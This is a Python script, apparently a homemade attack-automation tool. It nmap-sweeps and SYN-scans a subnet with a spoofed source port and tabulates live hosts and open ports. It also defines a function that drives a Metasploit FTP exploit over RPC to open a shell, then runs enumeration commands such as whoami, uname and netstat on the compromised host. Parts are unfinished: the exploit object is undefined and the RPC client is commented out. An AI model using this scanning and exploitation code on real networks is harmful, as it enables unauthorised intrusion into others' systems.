import pandas as pd
import nmap
import ipaddress
from tabulate import tabulate
from pymetasploit3.msfrpc import MsfRpcClient
import time

def ping_sweep(range):
    r = nm.scan(hosts=range, arguments='-n -sn --min-parallelism 100 --max-parallelism 256')
    return r


def syn_scan(ping_sweep):
    host_arg = ' '.join(ping_sweep)
    ps = nmap.PortScanner()
    syn = ps.scan(host_arg, arguments='-T5 -g 80 -sS --top-ports=1000')
    return syn

def vers_scan(other_scan):
    ports = []
    for each_port in other_scan.keys():
        ports.append(str(each_port))
    ip_list = []
    for ip in other_scan.values():
        for p in ip:
            ip_list.append(p)
    ps = nmap.PortScanner()
    v_scan = ps.scan(' '.join(ip_list), arguments='-sV -g 80 -p '+ ','.join(ports))
    return v_scan   

def parse_syn_data(syn):
    scan = syn
    status_dict = {}
    for ip in scan['scan'].keys():
        if 'tcp' in scan['scan'][ip].keys():
            for port in scan['scan'][ip]['tcp'].keys():
                if scan['scan'][ip]['tcp'][port]['state'] == 'open':
                    if ip not in status_dict.keys():
                        status_dict[ip] = [port]
                    else:
                        status_dict[ip].append(port)
    return status_dict


def count_live_in_range(ping_sweep, ranges):
    range_count = {}
    for i in ranges:
        range_count[i] = 0
    l_of_ips = []
    for ip in ping_sweep.keys():
        convert_ip = ipaddress.ip_address(ip)
        l_of_ips.append(convert_ip)
    l_of_ranges = []
    for range in ranges:
        x = ipaddress.ip_network(range, False)
        l_of_ranges.append(x)
    for eachRange in l_of_ranges:
        for eachIP in l_of_ips:
            if eachIP in eachRange.hosts():
                range_count[str(eachRange)] = range_count[str(eachRange)] + 1
    for ip_range, count in range_count.items():
        range_count[ip_range] = [(str(count))]

    return range_count


def get_services(tcp_scan):
    services = {}
    for ip in tcp_scan['scan'].keys():
        #['scan'][ip]['tcp'][port]['state']
        if 'tcp' in tcp_scan['scan'][ip].keys():
            for port in tcp_scan['scan'][ip]['tcp'].keys():
                if port not in services.keys():
                    services[port] = [ip]
                else:
                    services[port].append(ip)
    return services

def exploit_ftp(targets):
    exploit['RHOSTS'] = targets
    exploit['VERBOSE'] = True
    exploit['RPORT'] = 21
    exploit.execute(payload ='cmd/unix/interact')
    time.sleep(5)
    for ses in client.sessions.list.keys():
        shell = client.sessions.session(ses)
        e = enum_linux_host(shell)
        host_ip = client.sessions.list[ses]['session_host']
        the_shizzle= (host_ip,e)
        return the_shizzle

    return "EXPLOIT FAILED"

def enum_linux_host(shell):
    enum = {}
    commands = [
        'ip address',
        'uname -a',
        'whoami',
        'route -n',
        'ps -aux',
        'netstat -anop'
        ]
    for command in commands:
        shell.write(command)
        time.sleep(1)
        enum[command] = shell.read()
    return(enum)


#client = MsfRpcClient('mypassword', ssl=True)

nm = nmap.PortScanner()

r = ['192.168.2.0/24']

p = ping_sweep(''.join(r))

ss = syn_scan(p['scan'].keys())

syn_data = parse_syn_data(ss)

new_d = {}
for ip, ports in syn_data.items():
    new_d[ip] = ''.join(str(ports).strip('[]'))

df = pd.DataFrame.from_dict(new_d, orient='index', columns=['OPEN PORTS'])
print(tabulate(df, headers=('LIVE NODE', 'OPEN PORT(S)'), tablefmt='grid'))

df2 = pd.DataFrame.from_dict(count_live_in_range(p['scan'], r), orient='index')
print(tabulate(df2, headers=('IP RANGE', 'LIVE HOST COUNT'), tablefmt='grid'))

#services = get_services(ss)